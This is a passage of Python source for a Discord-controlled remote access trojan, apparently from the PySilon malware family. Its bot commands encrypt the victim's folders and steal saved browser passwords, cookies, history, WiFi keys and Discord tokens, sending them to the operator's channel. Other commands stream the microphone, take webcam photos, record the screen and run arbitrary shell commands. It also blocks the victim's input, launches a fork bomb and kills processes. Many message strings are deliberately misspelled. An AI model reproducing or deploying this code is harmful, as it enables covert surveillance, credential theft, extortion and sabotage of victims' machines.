                    embed = discord.Embed(title="🟢 Success",description=f'```Successfully encrypted the path!```', colour=discord.Colour.green())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content[:8] == '.decrypt':
                await message.delete()
                if message.content.strip() == '.decrypt':
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .decrypt <path to folder>```', colour=discord.Colour.red())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    folder_path = message.content[9:]
                    folder_path = folder_path.replace('\\','/')
                    with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\pysilon_encryption.key', "rb") as key_file:
                        key = key_file.read()
                    cipher_suite = Fernet(key)
                    with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\file_extensions.pkl', "rb") as ext_file:
                        original_file_extensions = pickle.load(ext_file)
                    for root, dirs, files in os.walk(folder_path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            if file_path.endswith('.pysilon'):
                                with open(file_path, 'rb') as f:
                                    encrypted_data = f.read()
                                decrypted_data = cipher_suite.decrypt(encrypted_data)
                                original_extension = original_file_extensions.pop(0)
                                new_file_name = os.path.splitext(file_path)[0] + original_extension
                                with open(new_file_name, 'wb') as f:
                                    f.write(decrypted_data)
                                os.remove(file_path)
                    embed = discord.Embed(title="🟢 Success",description=f'```Successfully decrypted the path!```', colour=discord.Colour.green())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content[:5] == '.grb':
                await message.delete()
                if message.content.strip() == '.grb':
                    reaction_msg = await message.channel.send('```Syntax: .grb <what-to-grb>```'); await reaction_msg.add_reaction('🔴')
                else:
                    if message.content[6:] == 'pswrds':
                        result = grab_passwords()
                        embed=discord.Embed(title='Grbbed savd pwords', color=0x0084ff)
                        for url in result.keys():
                            embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False)
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('📌')
                    elif message.content[6:] == 'history':
                        with open('history.txt', 'w') as history:
                            for entry in get_history().histories:
                                history.write(entry[0].strftime('%d.%m.%Y %H:%M') + ' -> ' + entry[1] +'\n\n')
                        reaction_msg = await message.channel.send(file=discord.File('history.txt')); await reaction_msg.add_reaction('🔴')
                        subprocess.run('del history.txt', shell=True)
                    elif message.content[6:] == 'cookies':
                        await message.channel.send('```Grbbig cookies. Pleas wait...```')
                        grab_cookies()
                        await asyncio.sleep(1)
                        reaction_msg = await message.channel.send('```Gbbed cokies```', file=discord.File(f'C:\\Users\\{getuser()}\\cookies.txt', filename='cookies.txt')); await reaction_msg.add_reaction('📌')
                        subprocess.run(f'del C:\\Users\\{getuser()}\\cookies.txt', shell=True)
                    elif message.content[6:].lower() == 'wifi':
                        networks = force_decode(subprocess.run('netsh wlan show profile', capture_output=True, shell=True).stdout).strip()
                        polish_bytes = ['\\xa5', '\\x86', '\\xa9', '\\x88', '\\xe4', '\\xa2', '\\x98', '\\xab', '\\xbe', '\\xa4', '\\x8f', '\\xa8', '\\x9d', '\\xe3', '\\xe0', '\\x97', '\\x8d', '\\xbd']
                        polish_chars = ['ą', 'ć', 'ę', 'ł', 'ń', 'ó', 'ś', 'ź', 'ż', 'Ą', 'Ć', 'Ę', 'Ł', 'Ń', 'Ó', 'Ś', 'Ź', 'Ż']
                        for i in polish_bytes:
                            networks = networks.replace(i, polish_chars[polish_bytes.index(i)])
                        network_names_list = []
                        for profile in networks.split('\n'):
                            if ': ' in profile:
                                network_names_list.append(profile[profile.find(':')+2:].replace('\r', ''))
                        result, password = {}, ''
                        for network_name in network_names_list:
                            command = 'netsh wlan show profile "' + network_name + '" key=clear'
                            current_result = force_decode(subprocess.run(command, capture_output=True, shell=True).stdout).strip()
                            for i in polish_bytes:
                                current_result = current_result.replace(i, polish_chars[polish_bytes.index(i)])
                            for line in current_result.split('\n'):
                                if 'Key Content' in line:
                                    password = line[line.find(':')+2:-1]
                            result[network_name] = password
                        embed=discord.Embed(title='Gbbed WiFi aswords', color=0x0084ff)
                        for network in result.keys():
                            embed.add_field(name='🪪 ' + network, value='🔑 ' + result[network], inline=False)
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('📌')
                    elif message.content[6:] == 'discord':
                        accounts = grab_discord.initialize(False)
                        for account in accounts:
                            reaction_msg = await message.channel.send(embed=account); await reaction_msg.add_reaction('📌') 
                    elif message.content[6:] == 'all':
                        await message.channel.send('Ging everything... Plese wait.')
                        try:
                            accounts = grab_discord.initialize(False)
                            for account in accounts:
                                reaction_msg = await message.channel.send(embed=account); await reaction_msg.add_reaction('📌') 
                        except: pass
                        try:
                            result = grab_passwords()
                            embed=discord.Embed(title='Gbed sav paords', color=0x0084ff)
                            for url in result.keys():
                                embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False)
                            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('📌')
                        except: pass 
                        try:
                            await asyncio.sleep(1)
                            grab_cookies()
                            reaction_msg = await message.channel.send('```Gbbed cookies```', file=discord.File(f'C:\\Users\\{getuser()}\\cookies.txt', filename='cookies.txt')); await reaction_msg.add_reaction('📌')
                            subprocess.run(f'del C:\\Users\\{getuser()}\\cookies.txt', shell=True)
                        except: pass
            elif message.content == '.join':
                await message.delete()
                vc = await client.get_channel(channel_ids['voice']).connect(self_deaf=True)
                vc.play(PyAudioPCM())
                await message.channel.send('`[' + current_time() + '] Joind voice-hannel and steaming mirophone in reltime`')
            elif message.content[:5] == '.show':
                await message.delete()
                if message.content.strip() == '.show':
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .show <what-to-show>```', colour=discord.Colour.red())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    if message.content[6:] == 'processes':
                        processes, processes_list = [], []
                        for proc in process_iter():
                            processes.append(proc.name())
                        processes.sort(key=str.lower)
                        how_many, temp = 1, processes[0]; processes.pop(0)
                        for i in processes:
                            if temp == i: how_many += 1
                            else:
                                if how_many == 1: processes_list.append('``' + temp + '``')
                                else: processes_list.append('``' + temp + '``   [x' + str(how_many) + ']'); how_many = 1
                                temp = i
                        total_processes = len(processes)
                        processes = ''
                        reaction_msg = await message.channel.send('```Processes at ' + current_time() + ' requested by ' + str(message.author) + '```')
                        processes_messages.append(reaction_msg)
                        for proc in range(1, len(processes_list)):
                            if len(processes) < 1800:
                                processes = processes + '\n**' + str(proc) + ') **' + str(processes_list[proc])
                            else:
                                processes += '\n**' + str(proc) + ') **' + str(processes_list[proc])
                                reaction_msg = await message.channel.send(processes)
                                processes_messages.append(reaction_msg)
                                processes = ''
                        reaction_msg = await message.channel.send(processes + '\n Total processes:** ' + str(total_processes) + '**\n```If you want to kill a process, type  .kill <process-number>```')
                        processes_messages.append(reaction_msg)
                        await reaction_msg.add_reaction('🔴')
            elif message.content == '.foreground':
                await message.delete()
                foreground_process = active_window_process_name()
                if foreground_process == None:
                    embed = discord.Embed(title="📛 Error",description='```Failed to get foreground window process name.```', colour=discord.Colour.red())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    embed = discord.Embed(title=str(foreground_process),description=f'```You can kill it with -> .kill {foreground_process}```', colour=discord.Colour.green())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content[:10] == '.blacklist':
                await message.delete()
                if message.content.strip() == '.blacklist':
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .blacklist <process-name>```', colour=discord.Colour.red())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    if not os.path.exists(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln'): 
                        with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8'): pass
                    with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
                        disabled_processes_list = disabled_processes.readlines()
                    for x, y in enumerate(disabled_processes_list): disabled_processes_list[x] = y.replace('\n', '')
                    if message.content[11:] not in disabled_processes_list:
                        disabled_processes_list.append(message.content[11:])
                        with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8') as disabled_processes:
                            disabled_processes.write('\n'.join(disabled_processes_list))
                        embed = discord.Embed(title="🟢 Success",description=f'```{message.content[11:]} has been added to process blacklist```', colour=discord.Colour.green())
                        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    else:
                        embed = discord.Embed(title="📛 Error",description='```This process is already blacklisted, so there\'s nothing to disable```', colour=discord.Colour.red())
                        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content[:10] == '.whitelist':
                await message.delete()
                if message.content.strip() == '.whitelist':
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .whitelist <process-name>```', colour=discord.Colour.red())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    if not os.path.exists(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln'): 
                        with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8'): pass
                    with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
                        disabled_processes_list = disabled_processes.readlines()
                    for x, y in enumerate(disabled_processes_list): disabled_processes_list[x] = y.replace('\n', '')
                    if message.content[11:] in disabled_processes_list:
                        disabled_processes_list.pop(disabled_processes_list.index(message.content[11:]))
                        with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8') as disabled_processes:
                            disabled_processes.write('\n'.join(disabled_processes_list))
                        embed = discord.Embed(title="🟢 Success",description=f'```{message.content[11:]} has been removed from process blacklist```', colour=discord.Colour.green())
                        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    else:
                        embed = discord.Embed(title="📛 Error",description='```This process is not blacklisted```', colour=discord.Colour.red())
                        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content[:5] == '.kill':
                await message.delete()
                if message.content.strip() == '.kill':
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .kill <process-name-or-ID>```', colour=discord.Colour.red())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                elif check_int(message.content[6:]):
                    if len(processes_list) > 10:
                        if int(message.content[6:]) < len(processes_list) and int(message.content[6:]) > 0:
                            reaction_msg = await message.channel.send('```Do you really want to kill process: ' + processes_list[int(message.content[6:])].replace('`', '') + '\nReact with 💀 to kill it or 🔴 to cancel...```')
                            process_to_kill = [processes_list[int(message.content[6:])].replace('`', ''), False]
                            await reaction_msg.add_reaction('💀')
                            await reaction_msg.add_reaction('🔴')
                        else:
                            embed = discord.Embed(title="📛 Error",description="```There isn't any process with that index. Range of process indexes is 1-" + str(len(processes_list)-1) + '```', colour=discord.Colour.red())
                            embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    else:
                        embed = discord.Embed(title="📛 Error",description='```You need to generate the processes list to use this feature\n.show processes```', colour=discord.Colour.red())
                        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                elif message.content[6:].lower() in [proc.name().lower() for proc in process_iter()]:
                    stdout = force_decode(subprocess.run(f'taskkill /f /IM {message.content[6:].lower()} /t', capture_output=True, shell=True).stdout).strip()
                    await asyncio.sleep(0.5)
                    if message.content[6:].lower() not in [proc.name().lower() for proc in process_iter()]:
                        embed = discord.Embed(title="🟢 Success",description=f'```Successfully killed {message.content[6:].lower()}```', colour=discord.Colour.green())
                        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    else:
                        embed = discord.Embed(title="📛 Error",description=f'```Tried to kill {message.content[6:]} but it\'s still running...```', colour=discord.Colour.red())
                        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    embed = discord.Embed(title="📛 Error",description='```Invalid process name/ID. You can view all running processes by typing:\n.show processes```', colour=discord.Colour.red())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content[:4] == '.cmd':
                await message.delete()
                if message.content.strip() == '.cmd':
                    reaction_msg = await message.channel.send('```Syntax: .cmd <command>```'); await reaction_msg.add_reaction('🔴')
                else:
                    cmd_output = force_decode(subprocess.run(message.content[5:], capture_output= True, shell= True).stdout).strip()
                    message_buffer, cmd_messages = '', []
                    reaction_msg = await message.channel.send('```Executed command: ' + message.content[5:] + '\nstdout:```'); cmd_messages.append(reaction_msg)
                    for line in range(1, len(cmd_output.split('\n'))):
                        if len(message_buffer) + len(cmd_output.split('\n')[line]) > 1950:
                            reaction_msg = await message.channel.send('```' + message_buffer + '```'); cmd_messages.append(reaction_msg)
                            message_buffer = cmd_output.split('\n')[line]
                        else:
                            message_buffer += cmd_output.split('\n')[line] + '\n'
                    reaction_msg = await message.channel.send('```' + message_buffer + '```'); cmd_messages.append(reaction_msg)
                    reaction_msg = await message.channel.send('```End of command stdout```'); await reaction_msg.add_reaction('🔴')
            elif message.content[:8] == '.execute':
                await message.delete()
                if message.channel.id == channel_ids['fl']:
                    if message.content.strip() == '.execute':
                        reaction_msg = await message.channel.send('```Syntax: .execute <filename>```'); await reaction_msg.add_reaction('🔴')
                    else:
                        if os.path.exists('/'.join(working_directory) + '/' + message.content[9:]):
                            try:
                                file_extension = os.path.splitext(message.content[9:])[1]
                                subprocess.run('start "" "' + '/'.join(working_directory) + '/' + message.content[9:] + '"', shell=True)
                                await asyncio.sleep(1)
                                ImageGrab.grab(all_screens=True).save('ss.png')
                                reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[Executed: ' + '/'.join(working_directory) + '/' + message.content[9:] + ']`').set_image(url='attachment://ss.png'), file=discord.File('ss.png')); await reaction_msg.add_reaction('📌')
                                subprocess.run('del ss.png', shell=True)
                                await message.channel.send('```Successfully executed: ' + message.content[9:] + '```')
                            except Exception as e:
                                reaction_msg = await message.channel.send(f'```❗ Something went wrong...```\n{str(e)}'); await reaction_msg.add_reaction('🔴')
                        else:
                            reaction_msg = await message.channel.send('```❗ File or directory not found.```'); await reaction_msg.add_reaction('🔴')
                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['fl']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
            elif message.content[:7] == '.F':
                await message.delete()
                if message.content.strip() == '.webcam':
                    reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take  photo wit taret C\'s webcam```')
                    await reaction_msg.add_reaction('🔴')
                else:
                    if message.content[8:] == 'photo':
                        pygame.camera.init()
                        cameras = pygame.camera.list_cameras()
                        if not cameras:
                            reaction_msg = await message.channel.send('No cameras found.')
                            await reaction_msg.add_reaction('🔴')
                            return
                        camera = pygame.camera.Camera(cameras[0])
                        camera.start()
                        time.sleep(1)
                        image = camera.get_image()
                        camera.stop()
                        pygame.image.save(image, f'C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png')
                        reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time(True) + ' `[https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpgn demand]`').set_image(url='attachment://webcam.png'),file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png'))
                        await reaction_msg.add_reaction('📌')
                        subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png', shell=True)
                    else:
                        reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```')
                        await reaction_msg.add_reaction('🔴')
            elif message.content == '.scrnrc':
                await message.delete()
                await message.channel.send("`Recding... Plese wait.`")
                output_file = f'C:\\Users\\{getuser()}\\{software_directory_name}\\recording.mp4'
                screen_width, screen_height = pyautogui.size()
                screen_region = (0, 0, screen_width, screen_height)
                frames = []
                duration = 60
                fps = 30
                num_frames = duration * fps
                start_time = time.time()
                try:
                    for _ in range(num_frames):
                        img = pyautogui.screenshot(region=screen_region)
                        frame = np.array(img)
                        frames.append(frame)
                    imageio.mimsave(output_file, frames, fps=fps, quality=8)
                    reaction_msg = await message.channel.send("ScrRcrding `[O eand]`", file=discord.File(output_file))
                    await reaction_msg.add_reaction('📌')
                    subprocess.run(f'del {output_file}', shell=True)
                except Exception as e:
                    embed = discord.Embed(title="📛 Error",description="An error occurred ing scren recrding.", colour=discord.Colour.red())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    await message.channel.send(embed=embed)
            elif message.content == '.block-input':
                if not input_blocked:
                    await message.delete()
                    async def on_press():
                        pass
                    async def on_release():
                        pass
                    async def on_click():
                        pass
                    keyboard_listener = keyboard.Listener(suppress=True)
                    mouse_listener = mouse.Listener(suppress=True)
                    keyboard_listener.start()
                    mouse_listener.start()
                    embed = discord.Embed(title="🚫 Input Blcked",description=f'```Input has ben bloked. Unblock it y usig .unblock-input```', colour=discord.Colour.red())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    await message.channel.send(embed=embed)
                    input_blocked = True
                else:
                    embed = discord.Embed(title="🔴 Hold on!",description=f'```The input is already blocked. Unlock it by using .unblock-input```', colour=discord.Colour.red())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    await message.channel.send(embed=embed)
            elif message.content == '.unblock-input':
                if input_blocked:
                    await message.delete()
                    keyboard_listener.stop()
                    mouse_listener.stop()
                    embed = discord.Embed(title="🟢 Input Unblocked",description=f'```Input has been unlocked. Block it by using .block-input```', colour=discord.Colour.green())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    await message.channel.send(embed=embed)
                    input_blocked = False
                else:
                    embed = discord.Embed(title="🔴 Hold on!",description=f'```The input is not blocked. Block it by using .block-input```', colour=discord.Colour.red())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    await message.channel.send(embed=embed)
            elif message.content == ".forkbomb":
                await message.delete()
                embed = discord.Embed(title="💣 Starting...",description=f'```Starting fork bomb... This process may take some time.```', colour=discord.Colour.dark_theme())
                embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                await message.channel.send(embed=embed)
                with open(f'C:\\Users\\{getuser()}\\wabbit.bat', 'w', encoding='utf-8') as wabbit:
                    wabbit.write('%0|%0')
                subprocess.Popen(f'C:\\Users\\{getuser()}\\wabbit.bat', creationflags=subprocess.CREATE_NO_WINDOW)
            elif message.content == '.display-graphic':
                await message.delete()
                embed = discord.Embed(title='📤 Provide a file containing graphic', description='Send your .drawdata file here', colour=discord.Colour.blue())
                embed.set_author(name='PIPI', icon_url='https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg')
                await message.channel.send(embed=embed)
                expectation = 'graphic_file'
            elif message.content[:15] == '.display-glitch':
                await message.delete()
                if message.content.strip() == '.display-glitch':
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .display-glitch <glitch_name>\nTo list all currently available glitches, type .display-glitch list```', colour=discord.Colour.red())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                elif message.content[16:] == 'list':
                    embed = discord.Embed(title="📃 List of currently available glitches:", description=f'- {"- ".join(flash_screen("list"))}\n`NOTE: This list will dramatically increase it\'s size in release v4.1`', colour=discord.Colour.blue())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                elif message.content[16:] + '\n' in flash_screen('list'):
                    flash_screen(message.content[16:])
                    embed = discord.Embed(title="🟢 Glitch succesfully executed", description=f'Remember to ⭐ our repository', colour=discord.Colour.blue())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    embed = discord.Embed(title="📛 Error",description='```Invalid argument!```', colour=discord.Colour.red())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif expectation == 'graphic_file':
                try:
                    split_v1 = str(message.attachments).split("filename='")[1]
                    filename = str(split_v1).split("' ")[0]
                    filename = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + filename
                    await message.attachments[0].save(fp=filename)
                    screen_manipulator(filename).display_graphic(10)
                    embed = discord.Embed(title='Graphic successfully displayed', description='Victim should see it on their screen for 10 seconds.\n`This functionality will be HUGELY improved in release v4.1`', colour=discord.Colour.green())
                    embed.set_author(name='PIPI', icon_url='https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg')
                    await message.channel.send(embed=embed)
                except Exception as err: 
                    await message.channel.send(f'```❗ Something went wrong while fetching graphic file...\n{str(err)}```')
                    expectation = None
class PyAudioPCM(discord.AudioSource):
    def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
        p = pyaudio.PyAudio()
        self.chunks = chunk
        self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)
    def read(self) -> bytes:
        return self.input_stream.read(self.chunks)
def check_int(to_check):
    try:
        asd = int(to_check) + 1
        return True
    except: return False
def active_window_process_name():
    try:
        pid = GetWindowThreadProcessId(GetForegroundWindow())
        return(Process(pid[-1]).name())
    except:
        return None
def process_blacklister():
    global embeds_to_send
    while True:
        if os.path.exists(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln'):
            with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
                process_blacklist = disabled_processes.readlines()
            for x, y in enumerate(process_blacklist): process_blacklist[x] = y.replace('\n', '')
            for process in process_blacklist:
                if process.lower() in [proc.name().lower() for proc in process_iter()]:
                    stdout = force_decode(subprocess.run(f'taskkill /f /IM {process} /t', capture_output=True, shell=True).stdout).strip()
                    time.sleep(1)
                    if process.lower() not in [proc.name().lower() for proc in process_iter()]:
                        embed = discord.Embed(title="🟢 Success", description=f'```Process Blaclister killed {process}```', colour=discord.Colour.green())
                        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                        embeds_to_send.append([channel_ids['man'], embed])
                    else:
                        embed = discord.Embed(title="📛 Error",description=f'```Process Blacklster tried to kill {process} but it\'s still running...```', colour=discord.Colour.red())
                        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                        embeds_to_send.append([channel_ids['man'], embed])
        time.sleep(1)
class screen_manipulator:
    def __init__(self, saved_file):
        with open(saved_file, 'r', encoding='utf-8') as read_data:
            input_data = read_data.readlines()[0]
        settings, pixeldata = input_data.split('|')
        self.settings = json.loads(settings)
        self.pixeldata = pixeldata.split(',')
        self.saved_file = saved_file
        self.canvas_width, self.canvas_height = self.settings['resolution'][0], self.settings['resolution'][1]
    def hex_to_rgb(self, hex):
        rgb = []
        hex = hex[1:]
        for i in (0, 2, 4):
            decimal = int(hex[i:i+2], 16)
            rgb.append(decimal)
        return tuple(rgb)
    def display_graphic(self, seconds):
        with open(self.saved_file, 'r', encoding='utf-8') as load_data:
            data = load_data.readlines()
        frame, unfetched_pixels = data[0].split('|')
        frame = json.loads(frame)
        pixels = []
        for line in unfetched_pixels.split(','):
            x, y = line.split(':')[0].split('.')
            if frame['mode'] == 'img':
                color = line.split(':')[1]
            elif frame['mode'] == 'bmp':
                color = frame['color']
            pixels.append((int(x), int(y), self.hex_to_rgb(color)))
        size = frame['size']
        screen_dc = GetDC(0)
        screen_x_resolution = GetDeviceCaps(screen_dc, DESKTOPHORZRES)
        screen_y_resolution = GetDeviceCaps(screen_dc, DESKTOPVERTRES)
        starting_pos = (int(screen_x_resolution*(int(frame['position'][0])/100)), int(screen_y_resolution*(int(frame['position'][1])/100)))
        drawing = pixels
        start_time = time.time()
        while time.time() - start_time < seconds:
            screen_dc = GetDC(0)
            for pixel in drawing:
                brush = CreateSolidBrush(RGB(pixel[2][0], pixel[2][1], pixel[2][2]))
                SelectObject(screen_dc, brush)
                PatBlt(screen_dc, starting_pos[0] + pixel[0] * size, starting_pos[1] + pixel[1] * size, size, size, PATCOPY)
            DeleteObject(brush)
            ReleaseDC(0, screen_dc)
def flash_screen(effect):
    hdc = GetDC(0)
    x, y = GetSystemMetrics(0), GetSystemMetrics(1)
    if effect == 'list':
        return ['invert\n', 'noise\n', 'lines\n', 'invert_squares\n', 'color_squares\n', 'diagonal_lines\n', 'snowfall\n', 'hypnotic_spirals\n', 'random_lines\n']
    elif effect == 'invert':
        while True:
            PatBlt(hdc, 0, 0, x, y, PATINVERT)
    elif effect == 'noise':
        for _ in range(x * y // 20):
            rand_x = random.randint(0, x)
            rand_y = random.randint(0, y)
            size = 100
            color = RGB(random.randrange(1), random.randrange(1), random.randrange(1))
            brush = CreateSolidBrush(color)
            SelectObject(hdc, brush)
            PatBlt(hdc, rand_x, rand_y, size, size, PATCOPY)
    elif effect == 'lines':
        for _ in range(0, y, 5):
            PatBlt(hdc, 0, _, x, 2, PATINVERT)
    elif effect == 'invert_squares':
        for _ in range(200):
            rand_x1 = random.randint(0, x)
            rand_y1 = random.randint(0, y)
            rand_x2 = random.randint(0, x)
            rand_y2 = random.randint(0, y)
            PatBlt(hdc, rand_x1, rand_y1, rand_x2 - rand_x1, rand_y2 - rand_y1, PATINVERT)
    elif effect == 'color_squares':
        for i in range(10):
            for x in range(0, x, 20):
                for y in range(0, y, 20):
                    brush = CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
                    SelectObject(hdc, brush)
                    PatBlt(hdc, x, y, 10, 10, PATCOPY)
                    DeleteObject(brush)
                    brush = CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
                    SelectObject(hdc, brush)
                    PatBlt(hdc, x + 10, y + 10, 10, 10, PATCOPY)
                    DeleteObject(brush)
    elif effect == 'diagonal_lines':
        for x in range(0, x, 10):
            brush = CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
            SelectObject(hdc, brush)
            PatBlt(hdc, x, 0, 1, y, PATCOPY)
            DeleteObject(brush)
        for y in range(0, y, 10):
            brush = CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
            SelectObject(hdc, brush)
            PatBlt(hdc, 0, y, x, 1, PATCOPY)
